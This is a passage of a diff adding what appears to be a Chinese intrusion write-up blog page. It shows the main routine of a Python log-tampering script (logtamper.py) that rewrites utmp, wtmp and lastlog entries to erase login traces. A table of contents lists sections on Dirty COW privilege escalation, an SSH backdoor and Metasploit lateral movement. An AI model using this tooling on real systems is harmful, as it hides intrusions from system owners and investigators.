+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">saveFile</span>(filename, contents):
+    <span style="color:#66d9ef">try</span>:
+        fp <span style="color:#f92672">=</span> open(filename, <span style="color:#e6db74">&#39;w+b&#39;</span>)
+        fp<span style="color:#f92672">.</span>write(contents)
+    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">IOError</span> <span style="color:#66d9ef">as</span> e:
+        showMessage(e)
+    <span style="color:#66d9ef">finally</span>:
+        fp<span style="color:#f92672">.</span>close()
+
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
+    usage <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;usage: logtamper.py -m 2 -u b4dboy -i 192.168.0.188</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> </span><span style="color:#ae81ff">\
+</span><span style="color:#ae81ff"></span><span style="color:#e6db74">        logtamper.py -m 3 -u b4dboy -i 192.168.0.188 -t tty1 -d 2015:05:28:10:11:12&#39;</span>
+    parser <span style="color:#f92672">=</span> OptionParser(usage<span style="color:#f92672">=</span>usage)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-m&#39;</span>, <span style="color:#e6db74">&#39;--mode&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;MODE&#39;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span> , help<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1: utmp, 2: wtmp, 3: lastlog [default: 1]&#39;</span>)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-t&#39;</span>, <span style="color:#e6db74">&#39;--ttyname&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;TTYNAME&#39;</span>)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-f&#39;</span>, <span style="color:#e6db74">&#39;--filename&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;FILENAME&#39;</span>)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-u&#39;</span>, <span style="color:#e6db74">&#39;--username&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;USERNAME&#39;</span>)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-i&#39;</span>, <span style="color:#e6db74">&#39;--hostname&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;HOSTNAME&#39;</span>)
+    parser<span style="color:#f92672">.</span>add_option(<span style="color:#e6db74">&#39;-d&#39;</span>, <span style="color:#e6db74">&#39;--dateline&#39;</span>, dest<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;DATELINE&#39;</span>)
+    (options, args) <span style="color:#f92672">=</span> parser<span style="color:#f92672">.</span>parse_args()
+
+    <span style="color:#66d9ef">if</span> len(args) <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>:
+        <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>MODE <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;1&#39;</span>:
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>USERNAME <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>HOSTNAME <span style="color:#f92672">==</span> None:
+                showMessage(<span style="color:#e6db74">&#39;+[Warning]: Incorrect parameter.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">==</span> None:
+                options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">=</span> UTMPFILE
+
+            <span style="color:#75715e"># tamper</span>
+            newData <span style="color:#f92672">=</span> getXtmp(options<span style="color:#f92672">.</span>FILENAME, options<span style="color:#f92672">.</span>USERNAME, options<span style="color:#f92672">.</span>HOSTNAME)
+            saveFile(options<span style="color:#f92672">.</span>FILENAME, newData)
+
+        <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>MODE <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;2&#39;</span>:
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>USERNAME <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>HOSTNAME <span style="color:#f92672">==</span> None:
+                showMessage(<span style="color:#e6db74">&#39;+[Warning]: Incorrect parameter.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">==</span> None:
+                options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">=</span> WTMPFILE
+
+            <span style="color:#75715e"># tamper</span>
+            newData <span style="color:#f92672">=</span> getXtmp(options<span style="color:#f92672">.</span>FILENAME, options<span style="color:#f92672">.</span>USERNAME, options<span style="color:#f92672">.</span>HOSTNAME)
+            saveFile(options<span style="color:#f92672">.</span>FILENAME, newData)
+
+        <span style="color:#66d9ef">elif</span> options<span style="color:#f92672">.</span>MODE <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;3&#39;</span>:
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>USERNAME <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>HOSTNAME <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>TTYNAME <span style="color:#f92672">==</span> None <span style="color:#f92672">or</span> options<span style="color:#f92672">.</span>DATELINE <span style="color:#f92672">==</span> None:
+                showMessage(<span style="color:#e6db74">&#39;+[Warning]: Incorrect parameter.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
+
+            <span style="color:#66d9ef">if</span> options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">==</span> None:
+                options<span style="color:#f92672">.</span>FILENAME <span style="color:#f92672">=</span> LASTLOGFILE
+
+            <span style="color:#75715e"># tamper</span>
+            modifyLast(options<span style="color:#f92672">.</span>FILENAME, options<span style="color:#f92672">.</span>USERNAME, options<span style="color:#f92672">.</span>HOSTNAME, options<span style="color:#f92672">.</span>TTYNAME , options<span style="color:#f92672">.</span>DATELINE)
+
+        <span style="color:#66d9ef">else</span>:
+            parser<span style="color:#f92672">.</span>print_help()
+</code></pre></div><h1 id="0x10-结束">0x10 结束</h1>
+<p>又2点了，抽支烟就该洗洗睡了，晚安~</p>
+</div>
+<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">
+
+
+
+
+
+
+
+
+
+
+<div class="toc">
+
+    <div class="page-header"><strong>目录</strong></div>
+
+    <div id="page-scrollspy" class="toc-nav">
+
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
+                            0x01 前言
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x02-%e4%bf%a1%e6%81%af%e6%8e%a2%e6%b5%8b">
+                            0x02 信息探测
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x03-%e8%82%9d">
+                            0x03 肝
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x04-%e6%96%b0%e5%b8%8c%e6%9c%9b-ld_preload">
+                            0x04 新希望 LD_PRELOAD
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x05-%e6%9f%b3%e6%9a%97%e8%8a%b1%e6%98%8e%e5%8f%88%e4%b8%80%e6%9d%91-centos">
+                            0x05 柳暗花明又一村-centos
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#%e5%8a%ab%e6%8c%81getuid">
+                            劫持getuid()
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x06-%e8%84%8f%e7%89%9b%e6%8f%90%e6%9d%83">
+                            0x06 脏牛提权
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x07-%e6%8c%81%e7%bb%ad%e8%ae%bf%e9%97%ae-ssh%e5%90%8e%e9%97%a8">
+                            0x07 持续访问-ssh后门
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x08-metaspliot-%e6%a8%aa%e5%90%91%e6%b8%97%e9%80%8f">
+                            0x08 metaspliot 横向渗透
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x09-%e6%93%a6%e5%b1%81%e8%82%a1">
+                            0x09 擦屁股
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+        
+            
+                
+                
+                    
+                    <ul class="nav">
+                    
+                    
+                        <li class="nav-item">
+                            <a class="nav-link text-left" href="#0x10-%e7%bb%93%e6%9d%9f">
+                            0x10 结束
+                            </a>
+                        </li>
+                    
+                    
+                    </ul>
+                    
+                
+            
+        
+
+    </div>
+
+</div>
+
+
+
+</div>
+
+  </article>
+</main>
+<footer>
+  <div>
+    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
+  </div>
+</footer>
+</body>
+</html>
